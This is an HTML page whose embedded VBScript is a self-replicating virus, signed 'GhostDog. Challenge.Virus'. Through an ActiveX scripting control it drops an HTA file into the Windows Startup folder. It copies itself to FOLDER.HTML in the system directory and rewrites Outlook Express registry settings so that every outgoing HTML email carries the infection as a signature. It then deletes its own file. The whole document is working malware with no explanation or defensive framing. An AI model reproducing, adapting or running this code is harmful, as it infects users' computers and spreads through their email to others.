<!-- saved from url=(0022)http://internet.e-mail -->
<html>
<body>
<script language="VBScript">
On Error Resume Next
Set Y=Document.CreateElement("object")
Document.Body.AppendChild Y
Y.Style.Display="none"
Y.Code="com.ms.activeX.ActiveXComponent"
H="<"&"html>~<-GhostDog. Challenge.Virus->.by GhostDog /UK.!!!~<"&"head>~<"&"title>Temp<"&"/title>~<"&"/head>~<"&"body bgcolor=""#ffffff"" text=""#ffffff"">~<"&"script language=""VBScript"">~On Error Resume Next~Set O=CreateObject(""Scripting.FileSystemObject"")~H=Replace(Document.Location.PathName,""%20"","" "")~Set F=O.OpenTextFile(H,1)~Y=False~Do While F..AtEndOfStream=False~A=F.ReadLine~If Y=False Then~If Right(A,6)=""<""&""html>"" Then~Y=True~U=Right(A,6)~End If~Else~If Left(A,7)=""<""&""/html>"" Then~U=U&Chr(126)&Left(A,7)~Exit Do~Else~U=U&Chr(126)&Replace(A,"""""""","""""""""""")~End If~End If~Loop~F.Close~Set K=O.CreateTextFile(O.BuildPath(O.GetSpecialFolder(1),""FOLDER.HTML""),True)~V=Chr(13)&Chr(10)~K.Write ""<""&""html>""&V&""<""&""body>""&V&""<""&""script language=""""VBScript"""">""&V&""On Error Resume Next""&V&""Set Y=Document.CreateElement(""""object"""")""&V&""Document.Body.AppendChild Y""&V&""Y.Style.Display=""""none""""""&V&""Y.Code=""""com.ms.activeX.ActiveXComponent""""""&V&""H=""""""&I(U)&""""""""&V&""Window.SetTimeout """"Y.SetClsId(""""""""{06290BD5-48AA-11D2-8432-006008C3FBFC}"""""""")"""",500""&V&""Window.SetTimeout """"Y.CreateInstance"""",550""&V&""Window.SetTimeout """"Y.SetProperty """"""""Doc"""""""",Replace(H,Chr(126),Chr(13)&Chr(10))"""",600""&V&""Window.SetTimeout """"Y.SetProperty """"""""Path"""""""",""""""""..\Start Menu\Programs\Startup\TEMP.HTA"""""""""""",650""&V&""Window.SetTimeout """"Y.Invoke """"""""Write"""""""",P"""",700""&V&""P=Array()""&V&""<""&""/script>""&V&""<""&""/body>""&V&""<""&""/html>""~K.Close~Set T=CreateObject(""WScript.Shell"")~R=""HKCU\Identities\""&T.RegRead(""HKCU\Identities\Default User ID"")&""\Software\Microsoft\Outlook Express\5.0\""~T.RegWrite R&""Signature Flags"",3,""REG_DWORD""~T.RegWrite R&""signatures\Default Signature"",""00000000""~T.RegWrite R&""signatures\00000000\file"",O.BuildPath(O.GetSpecialFolder(1),""FOLDER.HTML"")~T.RegWrite R&""signatures\00000000\name"",""Signature #1""~T.RegWrite R&""signatures\00000000\text"",""""~T.RegWrite R&""signatures\00000000\type"",2,""REG_DWORD""~T.RegWrite R&""Mail\Message Send HTML"",1,""REG_DWORD""~Window.SetTimeout ""O.DeleteFile H,True"",500~Window.SetTimeout ""Window.Close"",550~Function I(C)~I=Replace(Replace(Replace(Replace(Replace(C,""<"&"h"",""<""""&""""h""),""<"&"t"",""<""""&""""t""),""<"&"b"",""<""""&""""b""),""<"&"s"",""<""""&""""s""),""<"&"/"",""<""""&""""/"")~End Function~<"&"/script>~<"&"/body>~<"&"/html>"
Window.SetTimeout "Y.SetClsId(""{06290BD5-48AA-11D2-8432-006008C3FBFC}"")",500
Window.SetTimeout "Y.CreateInstance",550
Window.SetTimeout "Y.SetProperty ""Doc"",Replace(H,Chr(126),Chr(13)&Chr(10))",600
Window.SetTimeout "Y.SetProperty ""Path"",""..\Start Menu\Programs\Startup\TEMP.HTA""",650
Window.SetTimeout "Y.Invoke ""Write"",P",700
P=Array()
</script>
</body>
</html>
